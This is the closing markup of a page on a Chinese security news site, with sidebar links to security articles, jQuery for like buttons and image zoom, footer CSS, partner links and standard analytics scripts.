                    <a href="http://www.4hou.com/technology/7653.html" target="_blank">一次服务器被攻击的应急行动</a> 
                </li> 
                                <li>
                    <i></i>
                    <a href="http://www.4hou.com/info/news/7646.html" target="_blank">一个Tor浏览器0day漏洞价值100万美元，其中的隐情是……</a> 
                </li> 
                                <li>
                    <i></i>
                    <a href="http://www.4hou.com/info/news/7660.html" target="_blank">Elasticsearche僵尸网络：超过4000台服务器遭到两款POS 恶意软件感染</a> 
                </li> 
                                <li>
                    <i></i>
                    <a href="http://www.4hou.com/technology/7669.html" target="_blank">渗透挑战赛：从SQL注入到管理员权限</a> 
                </li> 
                                                </div>
       </div>

          
        </aside>
    </section>
    <div id="zooming">
        <img src="" id="imgcon">
    </div>
    <script>
        $(document).ready(function() {
            $.fn.postLike = function() {
                if ($(this).hasClass('done')) {
                    return false;
                } else {
                    $(this).addClass('done');
                    var id = $(this).data("id"),
                        action = $(this).data('action'),
                        rateHolder = $(this).children('.count');
                    var ajax_data = {
                        action: "bigfa_like",
                        um_id: id,
                        um_action: action
                    };
                    $.post("/wp-admin/admin-ajax.php", ajax_data,
                        function(data) {
                            $(rateHolder).html(data);
                        });
                    return false;
                }
            };
            $(document).on("click", ".favorite",
                function() {
                    $(this).postLike();
                });


            $("img").attr("title","");
            var altcon=$(".art_title").text();
            $("img").attr("alt",altcon);
            // 图片放大
            $(".article_cen").find('img').on("click",function(){
                var imgsrc=$(this).attr("src");
                var winthimg=$(this).width();
                var zooming=winthimg*1.2;
                $("#imgcon").css({width:zooming});
                $("#imgcon").css({marginLeft:-zooming/2});
                $("#imgcon").attr("src",imgsrc);
                $("#zooming").addClass("zoomaniatae");
                $("#imgcon").addClass("imgconadimate");
            });
            $("#zooming").on("click",function(){
                $("#imgcon").removeClass("imgconadimate");
                $("#zooming").removeClass("zoomaniatae");

            });

            $(window).scroll(function(){
                var scrtop=$(window).scrollTop();
                if(scrtop>450){
                    $(".article_authorbox_top").removeClass("asideanimateleave").addClass('asideanimate')
                    // $(".interested").hide()
                }
                else if(scrtop<450&&scrtop>350){
                     $(".article_authorbox_top").addClass("asideanimateleave").removeClass('asideanimate')
                     $(".interested").show()

                }
            });
            var start=$(".strat .wpfp-span .wpfp-link").text()
            if(start=="已收藏"){
                $(".strat").addClass("stratend")
            }else{
                $(".strat").removeClass("stratend")
            }

            $(".avatar-96").width(72);
            $(".avatar-96").height(72);
            $(".avatar-120").width(50);
            $(".avatar-120").height(50);

        });
    </script>
<style type="text/css">
.footer{height:auto; background-color: #282828}
.footer_about{width: 1200px;height: 50px;padding-top: 26px; margin: 0 auto;border-bottom-color: transparent !important; position: relative;}
.footer_about>a{font-size: 16px;height: 16px !important;line-height: 16px !important; float: left; padding-right: 18px; border-right:1px solid #ccc;}
.last-child-a{border:none !important}
.footer_bottom_cen p{ margin-top: 5px; margin-right: 25px;text-align: left; margin-bottom: 6px;float: left;}
.footer_bottom_cen>div{width: 450px;float: left;margin-right: 8px}
.footer_bottom{height: 74px}
.footerlogos{width: 130px; height: 24px; position: absolute;right: 10%; top:24px;}
.footerlogos dd{float: left; margin-right: 20px;cursor: pointer;}
.footerlogos dd a{display: block;width: 100%; height: 100%}
.wechartlogo{width: 20px; height: 20px; background-position:-227px 0px;}
.weibologo{width: 20px; height: 20px; background-position:-269px 0px;}
.zhihulogo{width: 20px; height: 20px; background-position:-361px 0px;}
.wechartlogo i{width: 80px;height: 78px;background-size: contain !important; right: 137px;display: none;opacity: 1;background: url(http://www.4hou.com/wp-content/themes/4houv2/img/wechatqr.png) no-repeat;position: absolute;top: -28px;}
.wechartlogo:hover i{display: block;}
.footer_bottom{width: 1200px; background-color: #282828; margin:0 auto } 
.footer_bottom_cen>div img{float: left; margin-right: 4px;margin-top: 4px; margin-left: 4px;width: 66px;}
.footer_bottom_cen{width: 100%}
.cloudserver{float: right !important; margin: 0 auto !important;width: 385px !important; margin-top: -31px}
.cloudserver img{float: left;}
.cloudserver dd{float: left;}
@media screen and (max-width:1260px) {
    .footer{width: 100%; padding: 0px 20px;}
    .footer_about{width: 100%}
    .footer_bottom{width: 100%}
    .footer_bottom div{width: 100%;display: none;}
}
@media screen and (max-width:660px) {
    .footer_about{padding-top: 14px; margin-bottom: 22px;}
    .footerlogos{display: none;}
    .footer_bottom{height: 44px;}

}
</style>
<footer class="footer">
    <div class="footer_about">
        <a href="/about" target=_blank>关于我们</a>
        <!--<a href="">加入我们</a>-->
        <a href="/submit" target=_blank>我要投稿</a>
        <a href="/service" target=_blank>广告及服务</a>
        <a href="/partner" target=_blank class="last-child-a">友情链接</a>
        <div class="footerlogos">
                <dd class="wechartlogo icons">
                  <i></i>
                </dd>
                <dd class="weibologo icons">
                 <a href="http://weibo.com/u/6069423878" target=_blank></a>
                </dd>
                <dd class="zhihulogo icons">
                    <a href="https://zhuanlan.zhihu.com/roartalk" target=_blank></a>
                    
                </dd>
        </div>
    </div>

    <section class="footer_bottom">
        <article class="footer_bottom_cen">
            <p>©2017 北京嘶吼文化传媒有限公司&nbsp;&nbsp;&nbsp;京ICP备16063439号</p>
            <p class="mobilefooter">©2017 北京嘶吼文化传媒有限公司&nbsp;&nbsp;|&nbsp;&nbsp;京ICP备16063439号</p>
            <div class="cloudserver">
                <span>本站由</span>
                <img src="http://img.4hou.com/wp-content/themes/4houv2/img/bdcloud.png">
                <img src="http://img.4hou.com/wp-content/themes/4houv2/img/bdcloud1.png">
                <img src="http://img.4hou.com/wp-content/themes/4houv2/img/ucloud.png">
                <span>提供云计算服务</span>
            </div>
        </article>
    </section>
    <section class="footer_top" style="display:none">
        <article class="footer_top_cen">
            <div class="homeqrcode">
                <dd class="icons"></dd>
                <div class="wb">
                    <a href="http://weibo.com/u/6069423878" target=_blank>
                    <i class="icons"></i>
                    <p>关注嘶吼传媒</p>
                    </a>
                </div>

                <div class="sh">
                    <a href="https://zhuanlan.zhihu.com/roartalk" target=_blank>
                    <i class="icons"></i>
                    <p>关注嘶吼</p>
                    </a>
                </div>
            </div>
            
            <h1>合作伙伴</h1>
            <div class="footer_friend">
                <a href="http://www.xinhuanet.com/talking/chinasafety/" target=_blank>新华网安全中国</a>
                <a href="http://jaq.alibaba.com/" target=_blank>阿里聚安全</a>
                <a href="http://www.seclover.com/" target=_blank>四叶草安全</a>
                <a href="https://sec.vip.com/" target=_blank>唯品会安全应急响应中心</a>
                <a href="https://www.duoyinsu.com/" target=_blank>安识科技</a>
                <a href="http://xianzhi.aliyun.com" target=_blank>云盾先知</a>
                <a href="http://www.ardsec.com/" target=_blank>兴华永恒</a>
                <a href="https://www.sobug.com/" target=_blank>SOBUG</a>
            </div>
        </article>
    </section>
    
</footer>
<aside class="side" >
    <div class="side_top icons "></div>
    <div class="iconbox">
        <div class="side_wechart icons iconhover">微信
            <dd></dd>
        </div>
        <a href="http://weibo.com/u/6069423878" target=_blank><div class="side_webo icons iconhover">微博</div></a>
        <a href="http://www.4hou.com/feed/" target=_blank><div class="side_rss icons iconhover">RSS</div></a>
        <a href="https://zhuanlan.zhihu.com/roartalk" target=_blank><div class="side_zh icons iconhover">知乎</div></a>
    </div>
    <div class="side_bottom icons"></div>
    
</aside>

<script>
    var _hmt = _hmt || [];
    (function() {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?ac201c14c3d2a4747423252be421e1bc";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

<script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-91554508-1', 'auto');
    ga('send', 'pageview');

</script>
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
</body>
</html>